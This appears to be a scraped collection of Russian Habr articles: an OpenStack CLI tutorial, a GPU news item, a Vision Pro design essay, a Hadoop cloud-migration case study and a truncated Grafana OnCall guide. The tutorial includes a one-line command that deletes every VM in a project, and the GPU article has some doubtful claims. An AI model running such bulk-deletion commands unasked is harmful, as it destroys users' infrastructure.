| 0efb6875-c481-4ec0-bc80-3392d84c89d6 | my_server-82  | ACTIVE | my_network=192.168.0.110 | Ubuntu 22.04 LTS 64-bit | SL1.1-2048-16 |
| 14c1677d-ef4c-4369-a64d-d4be73416eb9 | my_server-67  | ACTIVE | my_network=192.168.0.116 | Ubuntu 22.04 LTS 64-bit | SL1.1-2048-16 |
| 1619eaf7-c7ab-4db0-a875-38c39acabdac | my_server-76  | ACTIVE | my_network=192.168.0.52  | Ubuntu 22.04 LTS 64-bit | SL1.1-2048-16 |
| 1eadae93-f394-4301-a26f-b496f1e023ae | my_server-73  | ACTIVE | my_network=192.168.0.81  | Ubuntu 22.04 LTS 64-bit | SL1.1-2048-16 |
| 218bdd45-01a9-4b49-aa26-fb25ce7f7329 | my_server-80  | ACTIVE | my_network=192.168.0.76  | Ubuntu 22.04 LTS 64-bit | SL1.1-2048-16 |
| 24642e7f-b265-41a4-8d73-c29434655b30 | my_server-84  | ACTIVE | my_network=192.168.0.120 | Ubuntu 22.04 LTS 64-bit | SL1.1-2048-16 |
| 2e0c2dd3-8a07-421f-ba18-067e5fa320d9 | my_server-81  | ACTIVE | my_network=192.168.0.194 | Ubuntu 22.04 LTS 64-bit | SL1.1-2048-16 |

И посчитаем, что 100 серверов в активном состоянии:

openstack server list -f value | grep ACTIVE -c
100

Работа с сетевыми объектами
Мы получили 100 серверов, но как на них зайти и работать с ними? Можно использовать схему с дополнительным bastion-хостом, у которого будет выход в интернет. Заодно познакомимся поближе с сетевой частью.

В сетевую схему нужно добавить роутер, связать его с нашей приватной и внешней сетями, создать плавающий адрес (floating ip, внешний адрес) и привязать данный адрес к ВМ bastion:

openstack router create my_router
openstack router add subnet my_router my_subnet

Чтобы роутер позволял ВМ «выходить» в интернет из приватной сети (в данном случае из my_subnet) через NAT (для установки пакетов, обновления ПО и т.д.), нужно связать роутер с внешней сетью.

Получим имя внешней сети:

openstack network list --external -f value -c Name
external-network

Привяжем внешнюю сеть к роутеру:

openstack router set --external-gateway external-network my_router

Создадим floating IP, в выводе получим адрес:

openstack floating ip create external-network

Посмотреть созданные адреса можно командой:

openstack floating ip list

В моем случае адрес 31.129.42.122, и далее в тексте будет фигурировать именно он. У вас будет другой адрес. 

Теперь применим подход с bastion на практике. Выберем, например, первую ВМ как bastion-хост (можно создать отдельно ВМ с более подходящей конфигурацией и хостнеймом, но для упрощения пропустим этот шаг). Через бастион можно будет подключиться ко всем остальным ВМ. В моем случае выберу ВМ 99.

Ассоциируем Floating IP и ВМ 1:

openstack server add floating ip my_server-1 31.129.42.122

Получаем внутренний адрес (адрес из приватной сети 192.168.0.0/24) ВМ 99:

openstack server show my_server-99 -f value -c addresses
{'my_network': ['192.168.0.111']}

В моем случае адрес 192.168.0.111.
Подключимся к ВМ-99 и проверим, что все работает, как и задумывалось:

ssh -J root@31.129.42.122 root@192.168.0.111
root@my-server-99:~#

Работа с сетевыми дисками
Мы уже работали с локальными дисками. Давайте чуть усложним задачу и создадим 100 хостов с сетевыми дисками.

Для начала удалим все текущие ВМ.

Важно: при выполнении следующей команды удалятся все ВМ в текущем проекте. Проверьте, что вы находитесь в нужном проекте.

openstack server list -f value -c ID | xargs -i -P 10 bash -c 'openstack server delete {}'

Сначала нужно создать volume (сетевой диск). В данном случае в API нет инструмента для создания 100 дисков, и нужно обернуть простые shell-команды в циклы.

Можно выполнить их в цикле for i in {1..100}; do COMMAND; done. В таком случае операции будут выполняться по одной. Процесс займет некоторое время, зато будет наглядным. Или можно использовать утилиту xargs для параллельного выполнения.

Для нашего примера используем сгенерированную последовательность от 1 до 100. И в 10 поток (-P 10) выполняем команду по созданию вольюма — {} раскроется xargs’ом в полученный аргумент от seq:

seq 1 100 | xargs -i -P 10 bash -c 'openstack volume create --size 10 --image ""Ubuntu 22.04 LTS 64-bit"" my_volume_{}'

Для примера давайте создадим свой Flavor:

openstack flavor create --private --disk 0 --vcpus 1 --ram 1024  my_flavor_net_hdd

И в финале создадим 100 ВМ с сетевым диском:

seq 1 100 | xargs -i -P 10 bash -c 'openstack server create  --network my_network --key-name my_keypair --flavor my_flavor_net_hdd --volume volume_{} my_server_{}'

Итоги и шпаргалка
Мы рассмотрели, как управлять инфраструктурой, используя CLI инструменты при работе в терминале. А также, разобрали на базовые «кирпичики» автоматизацию более сложных процессов.

Вот шпаргалка с базовыми командами, которые помогут освоиться с управлением ресурсов OpenStack.

openstack keypair create
openstack keypair delete
openstack keypair list
openstack keypair show
openstack server create
openstack server delete
openstack server list
openstack server show
openstack server add floating ip
openstack server remove floating ip
openstack volume create
openstack volume delete
openstack volume list
openstack volume show
openstack router create
openstack router delete
openstack router list
openstack router show
openstack router add subnet
openstack router remove subnet
openstack router add route
openstack router remove route
openstack flavor list
openstack network create
openstack network list
openstack network show
openstack network delete
openstack subnet create
openstack subnet list
openstack subnet show
openstack subnet delete
openstack network list --external
openstack floating ip create
openstack floating ip list
openstack floating ip delete

Пишите в комментариях вопросы или альтернативные способы создать 100 серверов.

Возможно, эти тексты тоже вас заинтересуют:
→ Импортозамещение по-американски: развертывание собственного производства полупроводников идет не совсем по плану
→ И снова конденсаторы: как я ноутбук HP Spectre X360 13 ремонтировал и что из этого вышло
→ Не мытьем, так катаньем: NVIDIA начнет поставки в Китай мощных видеокарт, которые не подпадают под санкции США",2024-01-26
Китайские компании начали продавать гибридные видеокарты: десктопные устройства с ноутбучными чипами. Что происходит?,21,3,https://habr.com/ru/companies/selectel/articles/789118/,"
За последние несколько месяцев Китай активизировал производство гибридных видеокарт. Как и указано в заголовке, графические адаптеры десктопные, но чип — ноутбучный. Что это за видеокарты такие и в чем их отличие от обычных? Подробности — под катом. 

Смесь бульдога с носорогом
Сразу несколько техно-СМИ указали на новый тренд — продажу видеокарт, предназначенных для установки в десктопные ПК, но оснащенных чипами для мобильных устройств вместо обычных. Речь, конечно, не о бюджетных системах, иначе смысла производить «гибриды» просто не было бы. Китайцы, например, начали продавать относительно недорогие видеокарты GeForce 4000. Вроде как это аналоги 4080 и 4090, но, как говорится, есть нюанс. 

Главное — это их цена. Покупатели электронных устройств всегда надеются сделать выгодную покупку, приобретя какой-то топовый девайс по цене младшей модели. Так и здесь — вроде бы современные видеокарты продаются весьма недорого.

Как оказалось, ларчик открывается просто — видеокарта может быть рабочей, но вот чип — не десктопный, а мобильный. При этом графический адаптер может быть любым, в смысле, любого производителя, включая MSI, Asus, Gigabyte и других. 


Проблема в том, что такие графические адаптеры никогда не достигнут результатов, показанными настоящими «взрослыми» моделями, предназначенными для десктопных устройств. Да и относительно невысокая цена оказывается слишком большой, если учитывать тот самый нюанс, о котором говорилось выше. 

Можно ли отделить зерна от плевел? 
Да, но в нашем случае только тогда, когда снят «обвес», т.е., охлаждение. Если покупать такую систему, то естественно, ее фотографируют со всеми аксессуарами, так что отличить подделку от оригинала не получится. Пользователь может даже ничего и не заподозрить, поскольку карта по внешнему виду ничем не отличается от оригинала. 

А вот если систему охлаждения снять, тогда можно добраться до маркировки графического процессора, и можно будет увидеть, что это ноутбучная версия чипа — с буквой «М». Например, 4090М или 4080М. Маркировка при этом тоже разная. Если говорить о мобильной версии, то там используется процессор AD104, а вот если мы говорим о десктопных картах без «нюанса», то это чипы AD103 и AD102.



Кроме того, в описании, чаще всего, указывается количество ядер CUDA, и в десктопных картах с нормальным графическим процессором их количество всегда выше, чем у карт с ноутбучным чипом.

Чем это грозит пользователю? 
В целом, ничем таким, разве что разочарованием от напрасно потраченных денег. Так, гибридная видеокарта может быть на 40% менее производительной, чем реальный оригинал. Например, у 4070 показатель мощности — 285 Вт, а у мобильной версии чипа 4080М — 175 Вт. Разница просто разительная. 

Если говорить о цене, то покупатель, конечно, экономит. Так, гибридная видеокарта стоит около $600, в то время, как за оригинал просят почти в два раза больше. Уже это может служить признаком не совсем честной игры со стороны продавца. Конечно, чудеса случаются, но, основном, на Новый Год, и видеокарт это точно не касается. 

Если купить такую карту, а с ней что-то случится, то производитель вряд ли примет ее по гарантии. Хотя бы потому, что у производителей, если речь об официалах, таких карт и нет. Так что можно остаться у разбитого корыта — без карты и без денег. Да и сама карта может просто не «потянуть» очень уж требовательную к ресурсам игру, так что пользователь не получит удовольствия, а лишь расстроится. 

Не только видеокарты 
Да, китайцы в погоне за прибылью занимаются не только модификациями видеокарт, они реализуют и другие планы. 
По данным ряда зарубежных СМИ, небольшие китайские компании занимаются переработкой электронного мусора, и извлекают, например, SSD-чипы из старых, выброшенных SSD или смартфонов/планшетов. Известны даже компании, которые этим занимаются — это, например, Phison и Huirong. Вот фотография накопителя, который собран преимущественно из компонентов выброшенных на свалку смартфонов.


В общем-то, это и неплохо, при условии, что компоненты тестируются. И если в Корее, возможно, оборудование для тестов б/у чипов есть и оно используется. То в Китае системы для такого теста есть далеко не у всех небольших компаний, а стоят они немалых денег. Поэтому тут уж как повезет — можно приобрести недорогой SSD, который проработает годы, а можно купить накопитель, который выйдет из строя уже через пару дней или вообще не инициализируется.

Китайцы выпаивают и менее габаритные чипы, вплоть до мельчайших SMD-компонентов вроде конденсаторов, резисторов и иже с ними. Китай с каждым годом перерабатывает все больше электронного мусора, который приносит многим компаниям хороший доход.

Так что ситуация двоякая. С одной стороны хорошо, что перерабатывается электронный мусор и компоненты с вторичного рынка. С другой — сейчас нельзя быть уверенным, что купив новую планку памяти DDR4 или SSD, они действительно окажутся новыми, с соответствующим сроком эксплуатации. 

Другие интересные материалы

Что такое PCI DSS
Что такое сетевые интерфейсы и как они устроены
Что такое виртуальные облачные сети
",2024-01-26
Приложения для Vision Pro выглядят скучно,18,0,https://habr.com/ru/articles/789024/,"Наконец-то время пришлоНа прошлой неделе в социальных сетях был шквал волнения из-за того, что разработчики начали показывать свои приложения для Vision Pro. Новые продукты выходят на рынок очень редко, поэтому в сообществе инди-разработчиков витает реальное чувство ожидания.Я всегда полагаюсь на принципы дизайна Apple для своих приложений, строго придерживаюсь правил Human Interface Guidelines (HIG) и по максимуму использую описанные значения по умолчанию. Этот подход даёт ряд преимуществ как для разработчиков, так и для пользователей. К примеру, приложения становятся узнаваемыми, простыми, доступными и это только часть плюсов. Тем не менее строгое соблюдение этих рекомендаций иногда приводит к потере индивидуальности и характера приложения. Apple эффективно справляется с этой проблемой, используя цвета и слегка видоизменённый UX, чтобы выделить свои приложения на фоне других. Разработчики также нашли способы разнообразить дизайн элементов интерфейса.Где инновации?Основываясь на фактах, которые я наблюдаю, могу уверенно сказать, что принципы HIG оказываются неэффективными для дизайна интерфейсов Vision Pro. Apple вложила массу усилий в разработку правил, советов и руководств по проектированию элементов интерфейса, чтобы не столкнуться с подводными камнями, связанными с созданием 3D-интерфейсов. Это помогло избежать обилия подвижных элементов и визуального беспорядка, которые могут запутать пользователя или даже повлиять на его самочувствие.Однако это привело к тому, что многие приложения, которые я видел, были без своего характера. Скриншоты кажутся безвкусными, а отличить одно приложение от другого становится затруднительно. По отдельности приложения могут выглядеть впечатляюще из-за фундаментальных принципов дизайна на уровне платформы, но когда эти приложения собираются вместе, то такого эффекта уже нет.По большей части это преднамеренный шаг со стороны Apple, нацеленный на то, чтобы сделать приложения более понятными для пользователей и создать однообразие. Тем не менее, я надеюсь, что это ещё не всё. Можно ли ожидать многого от сообщества, когда даже крупные игроки не выпускают свои приложения на старте?Оправдания, оправданияНа ситуацию повлиял тот факт, что почти все разработчики имели доступ только к симулятору, что мешало понять, как работают жесты, визуальное взаимодействие и как это всё будет выглядеть на конечном устройстве. Есть большой разрыв между опытом работы на самом устройстве и симуляторе.Также беспокойство вызывало время. Несмотря на то, что Apple представила Vision Pro в сентябре 2023 года, отсутствие ясности относительно даты выпуска поставило многих разработчиков, включая меня, в ситуацию невозможности запланировать дату завершения работы над приложением. Я был уверен, что мы не увидим устройство до марта 2024 года, что даёт нам больше времени для экспериментов.Ещё одним фактором беспокойства является выгода. Первое время на рынке будет ограниченное количество устройств, которые полноценно будут работать только в США. Это затрудняет инвестирование в работу над абстрактной идеей. Разработкой приложений для Vision Pro занимаются в основном те, для кого проект стал страстной идеей.Надежда ещё естьЯ надеюсь, что в ближайшие месяцы мы станем свидетелями того, как разработчики раздвигают границы пользовательского опыта за пределы нынешних ограничений. Я хочу увидеть инновации в дизайне, визуальных эффектах и опыте использования, которых заслуживает Vision Pro. С нетерпением жду, что придумает сообщество, и буду продолжать делиться своими экспериментами.Примечание переводчикаАвтор статьи не ссылается на конкретные посты в социальных сетях с демонстрацией приложений, которые побудили его написать материал. Для перевода я собрал скриншоты приложений для Vision Pro, которыми делится разработчик Стив Тротон-Смит (Steve Troughton-Smith) в Mastodon. Скриншоты приложений он берёт из App Store для Vision Pro, который уже доступен в ограниченном режиме.PGA TOUR VisionApple Developer
Surgery appCANAL+Art Projector: Da Vinci EyeNBA AppGame Room (входит в Apple Arcade)Apple TipsApple FreeformApple MindfulnessApple MessagesApple PhotosApple NotesApple Mail",2024-01-26
Hadoop в Облаке: история миграции сотен петабайт,14,0,https://habr.com/ru/companies/vk/articles/789002/,"Миграция с «железа» в облако в большинстве случаев уже не кажется чем-то сложным или удивительным — тенденция на развертывание решений в облаке общая и устоявшаяся. Но если с переносом в облачную среду небольших ИТ-компонентов все просто, то в случае с глобальными системами на сотни петабайт данных все несколько иначе — такие кейсы встречаются редко. Меня зовут Михаил Марюфич. Я руководитель Data Platform в ОК, отвечаю за инфраструктуру для Big Data и машинного обучения. В этой статье я расскажу о нашем опыте переноса Hadoop с Bare Metal в облако: с чего стартовали, какие варианты рассматривали, как выстроили миграцию и с чем сталкивались в процессе.Исходная инсталляцияHadoop — один из основных компонентов ИТ-инфраструктуры ОК, который мы активно задействуем для работы с данными от разных источников.Наш Hadoop — довольно крупная система:размер кластера в дисках превышает 250 петабайт;объем оперативной памяти — 200 терабайт, которые распределены по 7 дата-центрам;выполняет более 10 тысяч задач ежедневно;имеет федерацию из трех основных кластеров.В Hadoop две ключевые подсистемы:YARN;HDFS.YARN — подсистема выполнения расчётов. Она интенсивно использует CPU и RAM на машине, на которой развернута. Состоит из: ресурсного менеджера (resourcemanager), который выделяет ресурсы;nodemanager, на которых запускаются приложения, потребляющие ресурсы.HDFS — подсистема хранения данных. Состоит из:namenode, где хранится информация о блоках;datanode, где хранятся блоки данных.В «железе» это выглядит следующим образом:есть мастер-хосты, где развернуты namenode и resourcemanager;есть worker-host, где развернуты nodemanager и datanode. Такая реализация нужна, чтобы эффективно потреблять ресурсы всей машины: например, datanode, как правило, больше задействуют диски, а nodemanager — наоборот.Чтобы обеспечить работу Hadoop без даунтаймов, мы используем классическую схему c синхронизацией namenode через кворумные журналы (quorum journal):есть активная namenode, которая пишет информацию; есть standby namenodes, которые зачитывают логи изменений из журналов, синхронизируют изменения и могут стать активными в любой момент.К тому же наш Hadoop использует преимущества зон доступности — фактически у каждого блока реплики находятся в трех удаленных друг от друга дата-центрах. Это позволяет гарантировать отказоустойчивость решения даже в случае временного или полного выхода одного ЦОДа из строя. Проблемы исходной реализации и пути их решенияУ нашего Hadoop на железе было несколько «слабых мест», которые хотелось устранить или улучшить.Эксплуатация. Большинство задач, связанных с администрированием решения и обслуживанием инфраструктуры нам приходилось частично или полностью выполнять вручную. Замена/добавление узлов, обновление конфигураций на кластере, развертывание новых кластеров — многие моменты требовали вовлечения специалистов.Мутабельные состояния компонентов. У нас хорошо развиты практики работы с физическим оборудованием, что позволяет минимизировать появление мутабельных состояний. Вместе с тем, полностью исключить ситуации, когда на части узлов оказываются неконсистентные с другими узлами кластера конфигурации или версии ПО, на практике не получилось, что чревато инцидентами.Объединение Compute и Storage. Мы хотели разделить Compute и Storage, чтобы повысить эффективность потребления ресурсов. Потребление мощностей неравномерно в течение дня, на ночное время приходится пик вычислительных нагрузок — по нашему внутреннему SLA все расчёты должны быть закончены к утру. В итоге нам нужно выделять мощности на проект с большим запасом, который будет простаивать большую часть времени. В схеме с разделенным compute и storage мы получаем возможность расширить кластер в моменты высоких нагрузок, а когда ресурсы не востребованы — передавать их другим приложениям.График потребления CPU.То есть нам нужна была реализация, которая позволила бы:обеспечить независимое горизонтальное и вертикальное масштабирование compute- и storage-слоёв;повысить удобство эксплуатации (ввод-вывод узлов, создание новых кластеров и других операций);поддерживать иммутабельное состояние компонентов.Добиться этого можно было тремя способами.Переход на Managed-инфраструктуру. Подход подразумевает использование инфраструктуры и сервисов стороннего вендора, который берет на себя задачи администрирования и обслуживания. Вариант позволяет по умолчанию получить разделение compute и storage, а также уйти от эксплуатационных трудностей. Но нам он не подходил — мы не можем хранить данные пользователей в публичных облаках, да и стоимость развертывания и поддержки такого решения под наш объем данных в стороннем облаке неоправданно велика. Смена стека технологий. Потенциально мы могли применить в качестве storage что-то compatible (ceph, apache ozone, свое решение), а в качестве compute — spark over k8s или trino over k8s. Это наиболее популярные варианты решений. Но в нашем случае такой подход не оправдан: во-первых, у нас уже есть hdfs, который нас целиком устраивает, во-вторых, у нас есть не только Spark, но и другие legacy-инструменты, а Kubernetes нет вовсе. К тому же менять весь стек ради получения нескольких преимуществ — не самый очевидный путь.Развертывание решения на внутренней инфраструктуре. В VK есть собственный контейнерный оркестратор One-Cloud. Ближайший его аналог из open-source — Kubernetes. По сути, One-Cloud — внутреннее облако, которым пользуются многие бизнес-юниты холдинга (OK, ВКонтакте, Дзен и другие). То есть мы можем развернуть Hadoop в One-Cloud и разделить compute/storage (hdfs/yarn). Причём такой путь уже проторен — подобные проекты уже реализовывали Uber и Yandex. Для нас этот вариант стал приоритетным — он эволюционный и согласуется со стратегией развития компании. От идеи к первым проработкамOne-Cloud — это большой контейнерный оркестратор, который управляет распределением всех ресурсов. Фактически он решает, где будет размещен тот или иной инстанс приложения. Например, nodemanager и datanode могут быть автоматически размещены на разных хостах. Главное условие для системы — максимально использовать доступные ресурсы. Для нас основное преимущество облака — решение проблемы менеджмента ресурсов и возможность гибко масштабировать компоненты без необходимости их ручного переноса между хостами.Чтобы развернуть кластер в облаке, достаточно небольших манифестов с указанием Docker-образа, количества ресурсов и некоторых дополнительных параметров. На первый взгляд, ничего сложного. Но для работы Hadoop нам нужно было предварительно решить несколько проблем.Конфигурация. Во внешнем мире конфигурирование решают разными способами. В ОК для этого применяется собственная система — Portal Management System (PMS). Инструмент проинтегрирован со всем продакшеном. Он позволяет писать конфигурации к отдельному приложению и подписываться на изменения этих конфигураций. Используя PMS, можно доставлять файлы с конфигурациями в контейнеры Hadoop. В итоге задачи менеджмента конфигураций мы закрываем с помощью Portal Management System.Kerberos. В Hadoop есть Kerberos — сетевой протокол аутентификации с использованием центра доверия. Он применяется для аутентификации клиентов кластера и узлов внутри кластера. Фактически это единственный способ настроить security в Hadoop. В реализации на Bare Metal мы контролировали эти процессы в полуручном режиме, но для облака сразу искали способ полной автоматизации. Для этого мы написали Kerberos Registration manager — компонент, который сканирует топологию новых кластеров, находит узлы без учётки и создаёт их в Kerberos, а также создаёт keytabs и заливает их в Vault.В итого пайплайн создания компонентов кластера выглядит так:Выполняем сабмит манифеста в облако.Облако определяет сервер, подходящий для запуска. Стартует контейнер.В контейнер доставляются конфигурации, сертификат, kerberos keytab.Стартует Hadoop. Узел Hadoop входит в кластер.Так мы можем создать кластер, в котором будут разделены Compute и Storage, HDFS и YARN.От теории к реальным петабайтамПосле выработки алгоритма создания кластера в облаке, стал вопрос переноса сотен петабайтов данных с физического оборудования в облачную среду. Есть два основных подхода к миграции:постепенный перевод приложений на новый кластер;постепенное добавление облачных узлов.Постепенный перевод приложений на новый кластерМетод подразумевает развертывание облачного кластера и последовательную миграцию в него целых приложений или их крупных компонентов. Также можно реализовать несколько усложненную, но более экономичную схему, при которой облачный кластер постепенно расширяется, соразмерно «схлопыванию» физической инфраструктуры:постепенно переводим запись;копируем историю;наращиваем кластер, освобождаем старые ресурсы.Способ надёжен, но у него есть несколько недостатков:процесс требует ручного управления и контроля;копирование данных может затянуться на долгий срок;на момент миграции надо перестраивать бизнес-логику обращения с данными, а пользователи вынуждены работать одновременно с несколькими кластерами: читать в одних, писать в другие.В результате этот вариант нам не подошёл.Постепенное добавление облачных узловМетод подразумевает, что параллельно со старым кластером в облаке создаётся новая, пустая datanode, которая сразу включается в кластер.Кластер начинает писать данные на новую ноду. Параллельно начинается вывод одной из старых нод через процедуру декомиссии (блоки постепенно реплицируются на другие узлы).После того, как старая нода опустеет, её можно вывести из кластера.По такому алгоритму можно бесшовно перенести в облако все данные без влияния на конечного пользователя.Последним этапом в облако переносится namenode. После этого миграцию Hadoop в облако можно считать завершённой. Причём такой подход исключает даунтайм и потерю данных.Мы начали миграцию по этому пути, но…Миграция и первые несоответствия ожиданиямПосле запуска процедуры переноса данных на ноду в облаке мы получили скорость репликации на уровне 2 тысяч блоков в минуту. Это примерно 250 Гб. С учётом того, что у нас даже в не самом большом кластере было около 150 млн блоков, на миграцию с такой скоростью нужно было около 52 дней, что непозволительно долго.Мы начали разбираться, изучили Namenode и увидели, что ядра не загружены, но в фоне крутится RedundancyMonitor, метод — computeDatanodeWork().Он отвечает за назначение заданий на репликацию нод. При этом алгоритм выбора датанод для репликации примерно следующий:Выбираются случайные датаноды в случайных дата-центрах.Проверяется соответствие политике размещения блоков — важно, чтобы были выбраны три датаноды в трех разных ЦОДах.Если условие не выполняется, цикл повторяется.Наш анализ показал, что 90% времени уходит на выбор случайных датанод и случайных ЦОДов. Примечательно, что обычно это быстрые операции. Чтобы найти первопричину проблемы, мы начали углубляться в реализацию на уровне кода. По дефолту порядок выбора случайной ноды такой:Проверяются все датаноды в ЦОДе.Проверяется наличие дисков нужного типа.Если диски есть, нода добавляется в список.Из списка выбирается случайная датанода.В такой реализации основная загвоздка была с проверкой на наличие дисков соответствующего типа — вероятно при разработке не учитывали, что в списке может быть не 10 элементов, а, например, 150, что кратно увеличивает времязатраты. Но в нашей инсталляции только HDD-диски, то есть проверять их соответствие не нужно. Это позволило немного переписать код и существенно упростить схему — теперь выбор всегда рандомный без дополнительных согласований.Такие манипуляции позволили нам повысить скорость репликаций до 15 тысяч блоков в минуту (2 ТБ против 250 ГБ до внесения изменений). В итоге время на миграцию сократилось с 52 до 7 дней. После этого оставался вопрос с миграцией мастеров.Миграция мастеровАлгоритм миграции мастеров довольно прозрачный. Например, есть кластер из двух namenode — одна из них активная, а другая standby. Есть три журнала, в которые они пишут с кворумом.В облако добавляется новая namenode и пара журналов (для сохранения нечетности).После проверки корректности, namenode в облаке делают активной.Одна из старых namenode выводится из строя. По такому же принципу в облако переносится вторая namenode standby. После этого оставшееся «железо» выводится из кластера. Миграция мастеров завершена.Но есть пара нюансов, с которыми пришлось разбираться.Невозможность динамического добавления компонентов. В Hadoop нельзя динамически добавлять новые namenode и журналы. Такую функциональность обещают в ближайшее время, но пока её нет. В итоге нам пришлось вручную перезагружать ноды в нескольких кластерах. Это не критично, но некие неудобства доставило.Сложность бесшовного переноса данных. С namenode работает много клиентов и разрыв связи с любым из них может привести к сбою на уровне процессов — например, к невозможности читать и писать, что равно локальному даунтайму. При этом нам было важно, чтобы на пользователях, работающих с Hadoop, миграция не отразилась. Трудность в том, что топология кластера хранится на клиенте в файле hdfs-site.xml.Если при создании новой облачной namenode не добавить информацию о ней на все клиенты и не выполнить соответствующую переконфигурацию клиента, система не сможет работать с кластером, запросы будут вести на standby namenode. Чтобы исключить такие проблемы, конфигурации топологии кластера надо доставить на каждого клиента и обновлять при их изменении. В нашем случае эту проблему решает, то, что конфигурации в большинстве приложений применяются динамически и хранятся в Portal Management System, который в данном случае выступает единым источником истины. Для Hadoop мы предварительно централизовали все конфиги, поэтому нам было достаточно указать информацию о новой ноде в одном месте и она автоматически подтягивается во всех клиентах кластера.После этого миграция была завершена. Профит!Жизнь после миграцииДовольно быстро после начала работы Hadoop в облаке мы столкнулись с двумя обстоятельствами. Во-первых, общая производительность расчётов упала на 10-15%. Потеря была отчасти ожидаемой и предсказуемой, поскольку мы отказались от локальной работы с данными и вызовов по сети стало больше. Для нас такая динамика не критична — потеря производительности с лихвой окупается преимуществами, полученными от работы в облаке.Во-вторых, мы начали отмечать общую деградацию производительности расчётов. Так, мы ежедневно проводим расчёты DWH. «Красненькое» — наша внутренняя прокси-метрика, которая позволяет понять, что когда расчёты завершены успешно.При работе с Hadoop на Bare Metal для нас было нормой, что расчёты заканчиваются утром — максимум до 11:00. После миграции в облако это условие соблюдалось. Но спустя некоторое время началась резкая деградация — окончание расчётов сместилось сначала на 12:00, потом на 16:00, а после и вовсе на 18:00. Причём, согласно статистике, расчёты занимают всю доступную память. А часть расчётов даже не успевает считаться день в день.Дальнейший анализ показал, что проблемы локализуются на IO — с некоторых datanode наши nodemanager считывают в 10-100 раз медленнее, чем с других.Причина оказалась в IOCost — это технология, которая позволяет изолировать приложения между собой по диску и предоставлять им гарантии чтения/записи. Например, чтобы Kafka могла комфортно «соседствовать» с любым другим приложением, использующим диск.В нашем случае оказалось, что есть прямая зависимость от включения IOCost на новые ЦОДы. Технологию постепенно раскатывали на новые ЦОДы, чтобы обеспечить лучшие гарантии, но это только усугубляло деградацию. В моменте мы решили откатить изменения (отказаться от IOCost) и увидели, что негативный эффект полностью нивелирован — расчёты снова начали заканчиваться до обеда и даже раньше (к 6-7 утра). Hadoop’у стало комфортно. В дальнейшем, чтобы обеспечить гарантии для «приложений-соседей», мы перепрофилировали решение и смогли включить IOCost на весь production без аффекта на Hadoop и другие приложения.Так мы закрыли последний гештальт и окончательно перешли на Hadoop в облаке.Наши результаты и выученные урокиВся миграция — от идеи до финала — заняла у нас 1,5 года и была проведена силами всего трёх специалистов. Переход в облако дал нам ряд преимуществ. Мы:получили возможность гибко масштабировать инфраструктуру и сэкономили на закупках N миллионов за счет возможности покупать только диски;делегировали задачи администрирования и обслуживания железа команде One- Cloud;полностью автоматизировали рутинные операции с Hadoop (расширение кластера, замена сломанных дисков/машин и другие);объединили вычислительные кластеры, научились ночью брать больше ресурсов и ускорили расчёты;сделали Hadoop as a service, который теперь предоставляем другим бизнес-юнитам холдинга.На основе нашего опыта можно сформулировать несколько рекомендаций:Не бойтесь читать и править исходный код системы, если это нужно для задачи.Покрывайте большим количеством метрик все компоненты Hadoop и вовремя реагируйте на подозрительные сигналы.Непонимание любого эффекта — потенциальная проблема, которая может стать реальной в самый неудобный момент. С любыми эффектами лучше разбираться сразу. ",2024-01-26
Excel vs Grafana: Автоматизация дежурств,14,0,https://habr.com/ru/companies/sravni/articles/789006/,"Привет, Хабр! Меня зовут Ахмед, я Deputy CTO в Сравни. Сегодня расскажу вам об опыте управления дежурствами в ИТ-команде.Представьте: вы нашли баг на проде; хотите рассказать о находке коллегам, которые отвечают за эту функциональность. Идёте в рабочий мессенджер, пишете в канал или групповой чат соответствующей команды.А дальше не всё идёт гладко.Инженер-1 – человек ответственный, но молчаливый – просто увидел сообщение и пошёл разбираться, не предупредив, что проблема взята в работу. Инженер-2 – коллега более коммуникабельный – увидел сообщение позднее, написал, что начинает исследование проблемы. Получаем двух инженеров, занятых одной и той же проблемой – упс!Не допустить такую и подобные ситуации поможет процесс дежурства. Вам достаточно будет указать в мессенджере специальный тег, на который отреагирует конкретный инженер – сегодняшний дежурный. Если нужно, вы сможете посмотреть состав дежурных в теге одним кликом (чтобы понять, кто конкретно займется вашей проблемой).Давайте расскажу, как такое настроить.Как появился наш процесс дежурства: боль → экселька → больПроблема “разные люди занимаются одной задачей” – не единственная беда, которая случается без настроенного процесса дежурств. Другой пример с теми же вводными: вы нашли баг, идёте оповестить причастных. Инженер-1 очень занят и решает, что его коллеги точно подхватят вопрос.Инженеры-2 и 3 заняты не меньше и тоже уверены, что люди из команды не оставят запрос без внимания. Ответственность размывается, проблема остаётся без реакции.Кроме проблем на проде, поводом сходить к коллегам могут быть обращения пользователей (“что-то не работает”), проблемы с инфраструктурой; билд, в конце концов, не собирается.Отлавливать и отрабатывать такие запросы с помощью дежурств – идея не новая. Подобная практика существует во многих компаниях; у нас – завелось не с первого раза.Первыми из наших коллег к рабочей схеме дежурств пришли DevOps-инженеры. В Сравни есть выделенная команда, которая выстраивает инфраструктуру и помогает разработчикам разбираться с сопутствующими вопросами. Разработчики приносили свои запросы в общий канал как угодно: не тегали ответственного или тегали всех сразу. Проблема могла долго болтаться без реакции (“думаю, подхватит кто-то другой”), после этого эскалировалась на лида, тот точечно тегал ответственного сотрудника, которому необходимо было взять обращение в работу. Не самая удобная и комфортная схема; случалось недовольство и споры.Глядя на всё это, лид DevOps-направления составил график дежурств и закрепил его в канале команды. Предполагалось, что коллеги, которые приходят с обращениями, должны ознакомиться с графиком ответственных и призвать конкретного человека.На деле же экселька оказалась непосильно сложным каналом получения информации – её  ненавидели, отвергали, проклинали, игнорировали.Тогда ребята из DevOps обратили внимание на возможности планировщика в Grafana OnCall.Там удалось обнаружить следующий воркфлоу:Создаёте учетные записи для всех дежурных; линкуете учётки с корпоративным мессенджером.Заполняете график дежурных в календаре.Создаёте в мессенджере обезличенный тег, по которому коллеги будут меншенить дежурных. У нас устоялся нейминг вида {teamName}_duty.Добавляете в Grafana ссылку на календарь, указываете название тега дежурного.Готово – после синхронизации с календарем, Grafana будет автоматически подставлять в обезличенный тег нужного дежурного, которому будут приходить оповещения. Календарь может быть любой, что умеет генерировать ics-ссылки. Привязки к какому-то конкретному почтовому серверу нет. График создается аналогично встрече. Вместо названия встречи указывается Grafana-юзернейм дежурного. Это может быть один или несколько человек. Можно управлять временными интервалами дежурств или выставить дежурство на весь день.Трюк именно с тегом прямо сейчас доступен в Grafana OnCall только для Slack. Есть интеграции с Telegram, MS Teams и прочими; там можно будет настроить оповещения в рамках создания цепочки эскалации, чтобы присылать алерты о наступившем событии. Давайте расскажу по шагам, как настроить расширенную версию воркфлоу, с тегами и Slack.Инструкция по настройке Этап 1: подготовка на стороне Grafana OnCallЗаходим в раздел Administration → Users and access → 